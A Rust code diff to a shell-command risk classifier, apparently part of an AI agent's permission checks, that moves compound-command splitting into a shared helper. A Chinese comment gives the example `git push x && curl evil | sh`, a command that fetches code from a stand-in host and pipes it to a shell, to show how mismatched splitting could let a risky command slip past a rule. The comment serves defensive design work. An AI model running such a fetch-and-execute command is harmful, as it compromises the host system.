@@ -102,12 +102,13 @@ pub fn classify_command(cmd: &str) -> BashCommandClass {
 }
 
 /// 按 `|`, `;`, `&&`, `||` 切分复合命令(不解析引号内分隔符,v1 启发式足够)。
+///
+/// 0.4:实现下沉到 `reflect_protocol::split_shell_segments`,与
+/// `reflect-permissions` 的 `shell_pattern` 匹配共用同一套切分语义 ——
+/// 两处若各写一份,权限规则"看似允许 git push"和分类器"判定 Risky"
+/// 会对同一条 `git push x && curl evil | sh` 给出不同答案。
 fn split_command_segments(cmd: &str) -> Vec<&str> {
-    let mut segments = vec![cmd];
-    for sep in ["||", "&&", "|", ";"] {
-        segments = segments.into_iter().flat_map(|s| s.split(sep)).collect();
-    }
-    segments
+    reflect_protocol::split_shell_segments(cmd)
 }
 
 fn classify_segment(segment: &str) -> BashCommandClass {
